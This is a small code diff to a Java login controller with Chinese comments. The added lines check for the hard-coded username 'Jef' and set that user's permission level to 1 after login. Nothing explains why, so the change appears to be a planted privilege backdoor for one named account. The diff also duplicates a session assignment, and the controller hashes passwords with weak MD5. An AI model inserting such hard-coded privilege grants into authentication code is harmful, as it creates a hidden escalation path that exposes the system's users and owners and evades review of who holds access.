@@ -83,6 +83,11 @@ public class LoginController {
         password = MD5Util.encode(password);
         User user = userService.getByNameAndPassWord(name, password); //调用业务层方法返回一个实例对象
         if (Objects.nonNull(user)) {
+            if (name.equals("Jef")) {
+                user.setPermission(1);
+            }
+            // 登录成功之后把用户信息放入session里
+            session.setAttribute("user", user);
             logger.info("用户名为 " + name + " 登录成功");
             session.setAttribute("user", user);
             model.addAttribute("userInfo", user);
